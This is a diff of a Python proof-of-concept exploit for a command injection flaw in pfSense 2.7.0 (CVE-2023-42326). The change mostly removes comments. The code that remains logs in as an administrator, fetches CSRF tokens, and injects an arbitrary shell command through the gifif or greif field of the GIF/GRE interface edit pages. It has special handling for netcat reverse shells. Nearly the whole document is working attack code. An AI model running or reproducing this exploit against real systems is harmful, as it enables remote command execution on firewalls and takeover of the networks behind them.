@@ -12,10 +12,7 @@ import urllib3
 # Suppress InsecureRequestWarning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Initialize Rich Console
 console = Console()
-
-# Function to parse command-line arguments
 def parse_args():
     parser = argparse.ArgumentParser(description="pfSense 2.7.0 Command Injection Exploit PoC (CVE-2023-42326)")
     parser.add_argument('-u', '--username', required=True, help='Username for pfSense admin login')
@@ -27,7 +24,6 @@ def parse_args():
     parser.add_argument('--insecure', action='store_true', help='Allow insecure server connections when using SSL (similar to curl -k)')
     return parser.parse_args()
 
-# Function to print the banner
 def print_banner():
     banner = r"""
 ██████╗ ███████╗██████╗ ██╗    ██╗███╗   ██╗███╗   ███╗███████╗
@@ -41,11 +37,9 @@ Done with ❤️  by @bl4ckarch
 """
     console.print(f"[bold cyan]{banner}[/bold cyan]")
 
-# Function to get current timestamp for logging
 def timestamp():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-# Function to check if the target is reachable
 def check_target_reachable(target, insecure):
     try:
         response = requests.get(f"{target}/", verify=not insecure)
@@ -59,7 +53,6 @@ def check_target_reachable(target, insecure):
         console.print(f"[{timestamp()}] [bold red][ERROR] Target {target} is unreachable: {str(e)}[/bold red]")
         return False
 
-# Function to extract CSRF token from a page
 def get_csrf_token(session, target, url_path, insecure, debug):
     full_url = f"{target}/{url_path}"
     console.print(f"[{timestamp()}] [bold cyan][INFO] Fetching CSRF token from: {full_url}[/bold cyan]")
@@ -81,7 +74,6 @@ def get_csrf_token(session, target, url_path, insecure, debug):
         console.print(f"[{timestamp()}] [bold red][ERROR] Failed to extract CSRF token from {url_path}[/bold red]")
         return None
 
-# Function to login to pfSense and return session
 def login(session, target, username, password, insecure, debug):
     csrf_token = get_csrf_token(session, target, "", insecure, debug)
     if not csrf_token:
@@ -105,7 +97,6 @@ def login(session, target, username, password, insecure, debug):
         console.print(f"[{timestamp()}] [bold red][ERROR] Failed to log in, check username and password[/bold red]")
         return False
 
-# Function to send the exploit request with timeout handling
 def send_exploit(session, exploit_url, data, mode, insecure, debug):
     console.print(f"[{timestamp()}] [bold cyan][INFO] Sending {mode.upper()} exploit request to {exploit_url}[/bold cyan]")
     with Progress() as progress:
@@ -114,7 +105,6 @@ def send_exploit(session, exploit_url, data, mode, insecure, debug):
             progress.update(task, advance=1)
 
     try:
-        # Send the exploit request with a timeout of 10 seconds
         exploit_response = session.post(exploit_url, data=data, timeout=10, verify=not insecure)
 
         if debug:
@@ -127,62 +117,44 @@ def send_exploit(session, exploit_url, data, mode, insecure, debug):
     except requests.exceptions.Timeout:
         console.print(f"[{timestamp()}] [bold yellow][WARNING] Request timed out. Reverse shell might have been triggered. Check your listener![/bold yellow]")
 
-# Consolidated exploit function for both GIF and GRE
 def exploit(session, target, command, mode, insecure, debug):
-    # Determine URL and parameter based on the mode
     url_path = "interfaces_gif_edit.php" if mode == 'gif' else "interfaces_gre_edit.php"
     param_name = "gifif" if mode == 'gif' else "greif"
-
-    # Fetch CSRF token
     csrf_token = get_csrf_token(session, target, url_path, insecure, debug)
     if not csrf_token:
         sys.exit(1)
-
     exploit_url = f"{target}/{url_path}"
-    
-    # Build malicious data payload with injected command
     malicious_data = {
         "__csrf_magic": csrf_token,
-        "if": "wan",  # Parent interface
-        "remote-addr": "10.10.10.2",  # Peer address
-        "tunnel-local-addr": "127.0.0.1",  # Local address
-        "tunnel-remote-addr": "10.10.10.2",  # Remote address
-        "tunnel-remote-net": "16",  # Subnet for the tunnel
-        "descr": "testpoc",  # Description
-        param_name: f"; {command} ; #",  # Injected command payload
-        "save": "Save"  # Save operation
+        "if": "wan",  
+        "remote-addr": "10.10.10.2",  
+        "tunnel-local-addr": "127.0.0.1",  
+        "tunnel-remote-addr": "10.10.10.2", 
+        "tunnel-remote-net": "16",
+        "descr": "testpoc",  
+        param_name: f"; {command} ; #", 
+        "save": "Save"  
     }
 
-    # If command contains 'nc', use threading
     if "nc" in command:
         console.print(f"[{timestamp()}] [bold blue][INFO] Netcat command detected. Running exploit in a new thread.[/bold blue]")
         thread = threading.Thread(target=send_exploit, args=(session, exploit_url, malicious_data, mode, insecure, debug))
         thread.start()
 
-        # Inform the user to check their reverse shell listener
         console.print(f"[{timestamp()}] [bold yellow][INFO] Check your reverse shell listener window[/bold yellow]")
     else:
         send_exploit(session, exploit_url, malicious_data, mode, insecure, debug)
 
 def main():
-    # Print banner
     print_banner()
-
-    # Parse arguments
     args = parse_args()
-
-    # Create a session to persist cookies
     session = requests.Session()
-
-    # Step 1: Check if the target is reachable
     if not check_target_reachable(args.target, args.insecure):
         sys.exit(1)
 
-    # Step 2: Log in to pfSense
     if not login(session, args.target, args.username, args.password, args.insecure, args.debug):
         sys.exit(1)
 
-    # Step 3: Execute the command injection exploit with the chosen command
     exploit(session, args.target, args.command, args.mode, args.insecure, args.debug)
 
 if __name__ == "__main__":
